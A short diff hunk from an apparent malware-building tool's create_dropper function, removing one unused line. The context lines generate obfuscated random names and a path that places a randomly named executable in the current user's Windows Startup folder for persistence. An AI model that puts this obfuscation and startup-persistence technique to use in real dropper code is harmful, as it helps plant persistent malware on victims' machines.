@@ -54,7 +54,6 @@ def create_dropper():
     obfuscated_main_function = random_string(is_random=True)
     obfuscated_file_var = random_string(is_random=True)
     obfuscated_file_name = random_string(is_random=True,is_exe=True)
-    num = randrange(1,10)
     obfuscated_startup_folder = f"'c:/users/{os.getlogin()}/" \
                                 f"appdata/roaming/microsoft/" \
                                 f"windows/start menu/programs/startup/{obfuscated_file_name}'"
